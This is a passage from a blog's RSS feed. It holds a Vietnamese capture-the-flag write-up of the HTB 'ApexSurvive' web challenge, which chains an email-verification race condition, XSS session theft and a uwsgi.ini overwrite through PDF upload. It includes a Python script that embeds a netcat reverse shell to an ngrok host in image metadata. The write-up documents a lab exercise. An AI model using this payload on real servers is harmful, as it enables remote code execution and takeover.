&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@api.route(&amp;#39;/sendVerification&amp;#39;, methods=[&amp;#39;GET&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@isAuthenticated
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;@sanitizeInput
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;def sendVerification(decodedToken):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; user = getUser(decodedToken.get(&amp;#39;id&amp;#39;))
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if user[&amp;#39;isConfirmed&amp;#39;] == &amp;#39;unverified&amp;#39;:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; if checkEmail(user[&amp;#39;unconfirmedEmail&amp;#39;]):
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; sendEmail(decodedToken.get(&amp;#39;id&amp;#39;), user[&amp;#39;unconfirmedEmail&amp;#39;])
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;Verification link sent!&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; else:
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;Invalid Email&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; return response(&amp;#39;User already verified!&amp;#39;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;-&amp;gt; CÃ³ thá»ƒ race condition save profile 2 email, Ä‘á»“ng thá»i sendVerification Ä‘á»ƒ yÃªu cáº§u gá»­i token Ä‘áº¿n email, tá»« Ä‘Ã³ ghi Ä‘Ã¨ ná»™i dung server gá»­i cho &lt;code&gt;test@email.htb&lt;/code&gt; thÃ nh cá»§a &lt;code&gt;test@apexsurvive.htb&lt;/code&gt;, tá»« Ä‘Ã³ láº¥y token cá»§a email &lt;code&gt;test@apexsurvive.htb&lt;/code&gt; Ä‘i verify lÃ  Ä‘Æ°á»£c &lt;strong&gt;isInternal=true&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id="complete-the-attack-chain--exploit"&gt;Complete the attack chain &amp;amp; Exploit
&lt;/h3&gt;&lt;p&gt;CÃ¡c bÆ°á»›c táº¥n cÃ´ng Ä‘Ã£ Ä‘áº§y Ä‘á»§, nÃªn mÃ¬nh sáº½ tá»•ng há»£p láº¡i nhÆ° sau:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Race condition verify email -&amp;gt; bypass isInternal&lt;/li&gt;
&lt;li&gt;Dom Based XSS táº¡i /addProduct -&amp;gt; láº¥y session admin/ bypass admin&lt;/li&gt;
&lt;li&gt;Race condition upload file -&amp;gt; RCE&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Attack chain cÃ³ táº­n 2 láº§n race condition nÃªn viá»‡c cÃ³ thá»ƒ solve nhanh hay cháº­m nÃ³ phá»¥ thuá»™c vÃ o may máº¯n khÃ¡ nhiá»u =)), sau khi rÃµ hÆ°á»›ng thÃ¬ mÃ¬nh deploy web rá»“i lÃ m luÃ´n vÃ  theo nhÆ° mÃ¬nh tháº¥y thÃ¬ race verify email lÃ  cÃ´ng Ä‘oáº¡n lÃ¢u nháº¥t.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Bypass isInternal
MÃ¬nh tiáº¿p tá»¥c sá»­ dá»¥ng Burp Repeater Ä‘á»ƒ race condition email, vá»›i 3 req sendVerification, 1 req update profile &lt;a class="link" href="mailto:test@email.htb" &gt;test@email.htb&lt;/a&gt; vÃ  1 req &lt;a class="link" href="mailto:test@apexsurvive.htb" &gt;test@apexsurvive.htb&lt;/a&gt;:
&lt;img src="https://hackmd.io/_uploads/HJaQ_L7R6.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Cuá»‘i cÃ¹ng cÅ©ng cÃ³ token cÃ³ thá»ƒ verify :cry:
&lt;img src="https://hackmd.io/_uploads/rJd7c8QAa.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/r1L4qLQAa.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;Bypass admin
Sá»­ dá»¥ng payload bÃªn trÃªn vÃ  report product id, mÃ¬nh cÃ³ admin token:
&lt;img src="https://hackmd.io/_uploads/SJeAcLXCT.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/SJSTiUXCT.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äáº¿n giá» truy cáº­p admin Ä‘á»ƒ RCE rá»“i
&lt;img src="https://hackmd.io/_uploads/HJJE3LX06.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;Upload file
MÃ¬nh lÃ m y há»‡t nhÆ° á»Ÿ trÃªn local vÃ  lá»¥m Ä‘Æ°á»£c flag cá»§a challenge:
&lt;img src="https://hackmd.io/_uploads/rJ27AU7CT.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/li&gt;
&lt;li&gt;Flag: &lt;strong&gt;HTB{0H_c0m3_0n_r4c3_c0nd1t10n_4nd_C55_1nj3ct10n_15_F1R3}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;P/s: Sau khi lÃ m xong mÃ¬nh má»›i tháº¥y lÃ  náº¿u nhÆ° render ra pdf thÃ¬ trang web sáº½ bá»‹ lá»—i vÃ  khÃ´ng lÆ°u láº¡i template Ä‘Ã³ nÃªn mÃ¬nh cÃ³ thá»ƒ tiáº¿p tá»¥c race mÃ  khÃ´ng pháº£i redeploy challenge.&lt;/p&gt;
&lt;h3 id="another-workaround-to-bypass-pdf-upload"&gt;Another workaround to bypass PDF upload
&lt;/h3&gt;&lt;p&gt;Sau khi Ä‘i táº£n máº¡n write up cá»§a má»i ngÆ°á»i, mÃ¬nh cÃ³ tÃ¬m Ä‘Æ°á»£c bÃ i write up nÃ y cÃ³ má»™t solution khÃ¡c Ä‘á»ƒ trigger RCE thÃ´ng qua upload file: &lt;a class="link" href="https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/" target="_blank" rel="noopener"
&gt;https://blog.elmosalamy.com/posts/apexsurvive-writeup-htb-cyber-apocalypse-2024/&lt;/a&gt;
ÄÃ¢y lÃ  má»™t cÃ¡ch ráº¥t hay khi server &lt;code&gt;uwsgi&lt;/code&gt; dÃ­nh lá»—i arbitary PDF upload, cá»¥ thá»ƒ lÃ  nháº±m vÃ o file &lt;code&gt;uwgsi.ini&lt;/code&gt; (Chi tiáº¿t á»Ÿ document): &lt;a class="link" href="https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html" target="_blank" rel="noopener"
&gt;https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;uwsgi&lt;/code&gt; cÃ³ kháº£ nÄƒng Ä‘á»c file config cá»§a chÃ­nh nÃ³ ká»ƒ cáº£ khi file dÆ°á»›i dáº¡ng binary, miá»…n sao nÃ³ tÃ¬m Ä‘Æ°á»£c chuá»—i báº¯t Ä‘áº§u khai bÃ¡o config há»£p lá»‡: &lt;code&gt;[uwsgi]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;uwsgi&lt;/code&gt; sá»­ dá»¥ng operator &lt;code&gt;@&lt;/code&gt; vÃ  cÃ¡c scheme Ä‘á»ƒ há»— trá»£ include, Ä‘á»c file vÃ  call cÃ¡c function, trong Ä‘Ã³ cÃ³ scheme &lt;code&gt;exec&lt;/code&gt; dÃ¹ng Ä‘á»ƒ thá»±c thi cÃ¢u lá»‡nh -&amp;gt; Thá»© mÃ¬nh cáº§n dÃ¹ng:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; [uwsgi]
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; ; read from a process stdout
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; body = @(exec://whoami)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Viá»‡c táº¥n cÃ´ng vÃ o file ini sáº½ cáº§n má»™t yáº¿u tá»‘ quan trá»ng khÃ¡c: LÃ m tháº¿ nÃ o Ä‘á»ƒ &lt;code&gt;uwsgi&lt;/code&gt; reload láº¡i config cá»§a chÃ­nh nÃ³?
Äiá»u nÃ y cÃ³ thá»ƒ Ä‘Æ°á»£c giáº£i quyáº¿t náº¿u nhÆ° &lt;code&gt;uwsgi&lt;/code&gt; config sáºµn chá»©c nÄƒng dÃ¹ng Ä‘á»ƒ debug &lt;code&gt;py-auto-reload&lt;/code&gt;, náº¿u nhÆ° phÃ¡t hiá»‡n sá»± thay Ä‘á»•i cá»§a cÃ¡c file trong server thÃ¬ config sáº½ Ä‘Æ°á»£c reload.
Viá»‡c upload file PDF lÃ  chÆ°a Ä‘á»§, nÃªn sau Ä‘Ã³ mÃ¬nh cáº§n pháº£i ghi Ä‘Ã¨ má»™t file &lt;code&gt;.py&lt;/code&gt; thÃ¬ server má»›i reload láº¡i config, tá»« Ä‘Ã³ trigger RCE.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;py&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;autoreload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Document cÅ©ng cÃ³ luÃ´n cáº£ POC nÃªn mÃ¬nh sáº½ sá»­a Ä‘á»ƒ Ä‘á»•i thÃ nh payload reverse shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;fpdf&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;FPDF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;from&lt;/span&gt; &lt;span class="n"&gt;exiftool&lt;/span&gt; &lt;span class="n"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ExifToolHelper&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;with&lt;/span&gt; &lt;span class="n"&gt;ExifToolHelper&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="n"&gt;as&lt;/span&gt; &lt;span class="n"&gt;et&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;et&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;set_tags&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;lmao.jpg&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;tags&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;model&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;amp;#x0a;[uwsgi]&amp;amp;#x0a;foo = @(exec://nc 0.tcp.ap.ngrok.io 18726 -e /bin/sh)&amp;amp;#x0a;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;},&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;-E&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;-overwrite_original&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="n"&gt;MyFPDF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;FPDF&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;pass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pdf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;MyFPDF&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pdf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;add_page&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pdf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;image&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./lmao.jpg&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;pdf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;exploit.pdf&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;F&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;LÆ°u Ã½: Náº¿u bÃ¡o lá»—i khÃ´ng cÃ³ module exiftool thÃ¬ mÃ¬nh sáº½ cháº¡y cÃ¢u lá»‡nh&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;python3&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;m&lt;/span&gt; &lt;span class="n"&gt;pip&lt;/span&gt; &lt;span class="n"&gt;install&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;U&lt;/span&gt; &lt;span class="n"&gt;pyexiftool&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Sau khi gen ra PDF thÃ¬ mÃ¬nh gá»­i Ä‘i Ä‘á»ƒ ghi Ä‘Ã¨ &lt;code&gt;/app/uwsgi.ini&lt;/code&gt;
&lt;img src="https://hackmd.io/_uploads/ByNAHNrR6.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Ghi Ä‘Ã¨ tiáº¿p &lt;code&gt;/app/application/database.py&lt;/code&gt; Ä‘á»ƒ trigger &lt;code&gt;uwgsi&lt;/code&gt; reload láº¡i config
&lt;img src="https://hackmd.io/_uploads/BJ0GU4BAT.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Log server thÃ´ng bÃ¡o viá»‡c file &lt;code&gt;database.py&lt;/code&gt; Ä‘Ã£ bá»‹ thay Ä‘á»•i, tiáº¿n hÃ nh kill tiáº¿n trÃ¬nh vÃ  khá»Ÿi Ä‘á»™ng láº¡i /app, load láº¡i config
&lt;img src="https://hackmd.io/_uploads/HJ4zLESRp.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Reverse Shell thÃ nh cÃ´ng
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/SyS4L4H0p.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;</description></item><item><title>Archives</title><link>https://kev1n1203.github.io/archives/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/archives/</guid><description/></item><item><title>Links</title><link>https://kev1n1203.github.io/links/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/links/</guid><description>&lt;p&gt;To use this feature, add &lt;code&gt;links&lt;/code&gt; section to frontmatter.&lt;/p&gt;
&lt;p&gt;This page&amp;rsquo;s frontmatter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;span class="lnt"&gt;4
&lt;/span&gt;&lt;span class="lnt"&gt;5
&lt;/span&gt;&lt;span class="lnt"&gt;6
&lt;/span&gt;&lt;span class="lnt"&gt;7
&lt;/span&gt;&lt;span class="lnt"&gt;8
&lt;/span&gt;&lt;span class="lnt"&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nt"&gt;links&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;GitHub&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;GitHub is the world&amp;#39;s largest software development platform.&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;website&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://github.com&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;- &lt;span class="nt"&gt;title&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;TypeScript&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;description&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;TypeScript is a typed superset of JavaScript that compiles to plain JavaScript.&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;website&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;https://www.typescriptlang.org&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nt"&gt;image&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="l"&gt;ts-logo-128.jpg&lt;/span&gt;&lt;span class="w"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;code&gt;image&lt;/code&gt; field accepts both local and external images.&lt;/p&gt;</description></item><item><title>Search</title><link>https://kev1n1203.github.io/search/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/search/</guid><description/></item></channel></rss>